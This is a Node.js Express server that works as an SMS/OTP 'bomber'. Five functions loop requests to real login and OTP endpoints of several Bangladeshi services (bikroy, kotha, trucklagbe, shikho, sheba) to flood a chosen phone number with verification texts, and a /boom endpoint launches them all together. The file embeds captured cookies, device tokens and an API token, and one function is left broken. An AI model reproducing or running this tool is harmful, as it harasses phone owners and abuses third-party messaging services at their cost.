const express = require("express");
const axios = require("axios");

const app = express();
const port = 3000;



async function boomber(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 10; i++) {
      try {
        const response = await axios.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', {
          params: { phone: number },
          headers: {
            'authority': 'bikroy.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'bn',
            'application-name': 'web',
            'cookie': 'your_cookie_here',
            'referer': 'https://bikroy.com/bn?login-modal=true&redirect-url=/bn',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
          }
        });

        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 180000));
    }
  }

  console.log("✅ All rounds completed.");
}

async function boomber1(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 20; i++) {
      try {
        const response = await axios.post(
  'https://web.kotha.app/api/otp',
  {
    'number': `+88${number}`,
    'retryAttempt': 0,
    'deviceToken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VJZCI6IjM0NTZjYjhmLTIzM2QtNGI3MS04MWM1LTU4NGViZWM0MmZjYiIsImlhdCI6MTc1MDc2MDg4MiwiZXhwIjoxNzUwNzYxNzgyfQ.SR8qeUKurzMXExCVFmmi30k9N7kTzjhwJdT6fJy226A',
    'deviceId': '3456cb8f-233d-4b71-81c5-584ebec42fcb'
  },
  {
    headers: {
      'authority': 'web.kotha.app',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'cookie': '_fbp=fb.1.1750760831908.836421696327277018; _ga_5Q0583973Z=GS2.1.s1750760835$o1$g0$t1750760835$j60$l0$h0; _ga=GA1.1.875733277.1750760835; AWSALBCORS=at9Yexi+0tm4dMhQXTkqlC8oQcqU/IIO1NbWHCQ2jofPwkNgsMtDzDe/uu7eH9XljqoA6fp9/6gECo8zvpEaUxqG9ZEac9ZvPXSRHtO5OuL96skde2iuaD5nj0tS; __Host-next-auth.csrf-token=e7b0b30e83c0d5cd60d40370fb618c9caa55601df14690b33479a769df805f9f%7C1079da5c29bf344f80588dbf4826cb6bac8093cb721d13c01ed90a45eb927da7; _gcl_au=1.1.1095184874.1750760848; __Secure-next-auth.callback-url=https%3A%2F%2Fweb.kotha.app%2F; _ga_F1NTDB2MG2=GS2.1.s1750760847$o1$g1$t1750760881$j26$l0$h712145416; AWSALB=YaizmUAC7bj3Qw6D5RIQgITqYJxJT8RRjxY8LM2oAMYOkSC+KMm5dI6CemDvoVkNSZJRryzsOgIAPvIorKCsDy3fXL2aZaQsfAWv791wgcWse2vW9fp3To6511+K',
      'origin': 'https://web.kotha.app',
      'referer': 'https://web.kotha.app/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);

        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 60000));
    }
  }

  console.log("✅ All rounds completed.");
}

async function boomber2(number, limit) {
  for (let i = 0; i < limit; i++) {
    try {
      const response = await axios.post(
        'https://tethys.trucklagbe.com/tl_gateway/tl_login/124/loginWithPhoneNo',
        {
          'userType': 'shipper',
          'phoneNo': number
        },
        {
          headers: {
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Origin': 'https://trucklagbe.com',
            'Referer': 'https://trucklagbe.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'deviceId': '103.102.136.621750754434094',
            'lat': '0',
            'lng': '0',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'source': 'website',
            'ut': '7TCEAKQLeGXk87hW664ok7rbv8t2qq4rl2dexBFDkhzW2GTG7fQ7s1FZ2AD3AhkzTpbA2BP66/1Ep+TxALjFlYJYMspCRscV5c/rd/cfVtp16TfkWmW4VubQXhihWJNtu7iauG1jHRW/fV4LIIo8PEKI4HcQqL/OIsrWypowzB9JsWalUdPIxfZaDvPexhNw'
          }
        }
      );

      console.log(`[${i + 1}/${limit}] Sent to ${number} | Response:`, response.data);
    } catch (error) {
      console.error(`[${i + 1}/${limit}] Failed:`, error.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000)); // 3 second wait
  }
}

async function boomber3(number, limit) {
  for (let i = 0; i < limit; i++) {
    try {
      const response = await axios.post(
  'https://api.shikho.com/auth/v2/send/sms',
  {
    'phone': `88${number}`,
    'type': 'student',
    'auth_type': 'login',
    'vendor': 'shikho'
  },
  {
    headers: {
      'authority': 'api.shikho.com',
      'accept-language': 'en-US,en;q=0.9',
      'origin': 'https://shikho.com',
      'referer': 'https://shikho.com/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);

      console.log(`[${i + 1}/${limit}] Sent to ${number} | Response:`, response.data);
    } catch (error) {
      console.error(`[${i + 1}/${limit}] Failed:`, error.message);
    }

    await new Promise(resolve => setTimeout(resolve, 120000)); // 3 second wait
  }
}

async function boombe(number, limit) {
  for (let i = 0; i < limit; i++) {
    try {
      

      console.log(`[${i + 1}/${limit}] Sent to ${number} | Response:`, response.data);
    } catch (error) {
      console.error(`[${i + 1}/${limit}] Failed:`, error.message);
    }

    await new Promise(resolve => setTimeout(resolve, 120000)); // 3 second wait
  }
}


async function boomber4(number, limit) {
  for (let i = 0; i < limit; i++) {
    try {
      const response = await axios.post(
  'https://accountkit.sheba.xyz/api/shoot-otp',
  {
    'mobile': `+88${number}`,
    'app_id': '8329815A6D1AE6DD',
    'api_token': 'qDI1cCD5deJEIYkzFl61m0lcl0zJDxEMS9B1HchAFH89LFCRrUXDoNLKAIR2'
  },
  {
    headers: {
      'authority': 'accountkit.sheba.xyz',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json;charset=UTF-8',
      'custom-headers': '{"portal-name":"Customer Web"}',
      'origin': 'https://www.sheba.xyz',
      'referer': 'https://www.sheba.xyz/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);

      console.log(`[${i + 1}/${limit}] Sent to ${number} | Response:`, response.data);
    } catch (error) {
      console.error(`[${i + 1}/${limit}] Failed:`, error.message);
    }

    await new Promise(resolve => setTimeout(resolve, 150000)); // 3 second wait
  }
}

app.get("/boom", async (req, res) => {
  const { number, limit } = req.query;
   try {
    boomber(number, limit);
    boomber1(number, limit);
    boomber2(number, limit);
    boomber3(number, limit);
    boomber4(number, limit);
     
     res.json({ response: "starting..."});
   } catch (e) {
     res.json({ error: e.message });
   }
  });

  app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
  });
